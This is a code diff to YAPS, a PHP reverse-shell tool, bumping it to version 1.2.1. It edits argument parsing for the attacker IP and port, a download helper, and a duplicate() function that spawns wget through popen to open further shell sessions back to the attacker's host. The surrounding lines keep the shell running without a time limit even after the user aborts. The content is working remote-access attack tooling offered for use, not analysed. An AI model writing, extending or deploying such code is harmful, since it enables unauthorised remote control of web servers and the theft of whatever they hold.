@@ -1,12 +1,12 @@
 <?php
 # YAPS - Yet Another PHP Shell
-# Version 1.2 - 17/07/21
+# Version 1.2.1 - 17/07/21
 # Made by Nicholas Ferreira
 # https://github.com/Nickguitar/YAPS
 
 
 //error_reporting(0);
-$version = "1.2";
+$version = "1.2.1";
 set_time_limit(0);
 ignore_user_abort(1);
 ini_set('max_execution_time', 0);
@@ -74,7 +74,7 @@ if(php_sapi_name() == "cli"){ // if yaps is run via cli, parse args
 			if(strpos($arg, ":") !== false){ // if an argument is of the form .*:[0-9]+
 				$socket = explode(":", $arg);
 				$ip = $socket[0];
-				$port = $socket[1];
+				$port = (int)$socket[1];
 			}
 		}
 	}
@@ -119,7 +119,6 @@ function white($str){
 	global $color;
 	return $color ? "\e[97m".$str."\e[0m" : $str;
 }
-
 
 
 function banner(){
@@ -349,7 +348,7 @@ function random_name($name = ""){
     return $name;
 }
 
-function download($url, $saveTo){ //download file from $url to /tmp
+function download($url, $saveTo){ //download file from $url to $saveTo
 	$randomName = random_name();
 	if(isAvailable('file_get_contents')){
 		if(isAvailable('file_put_contents')){
@@ -607,7 +606,7 @@ function duplicate(){
 
 	while($new_port = fread($s, 32)){
 		$new_port = (base64_encode($new_port) == "Cg==") ? $port: substr($new_port,0,-1); //if new_port= newline, new_port = old port
-		$socket = array('x' => $ip, 'y' => $new_port);
+		$socket = array('x' => $ip.":".$new_port);
 		fwrite($s, "Connecting to ".$ip.":".$new_port."\n");
 		if(isAvailable("popen") && isAvailable("pclose"))
 			pclose(popen("wget --post-data=\"".http_build_query($socket)."\" $curl_url > /dev/null &",'r')); // doesn't wait for wget to return
@@ -617,7 +616,7 @@ function duplicate(){
 	}
 }
 
-function get_request($url){
+function get_request($url){ //todo: change download function
 	$response = false;
 	if(isAvailable("file_get_contents")){
 		$response = file_get_contents($url);
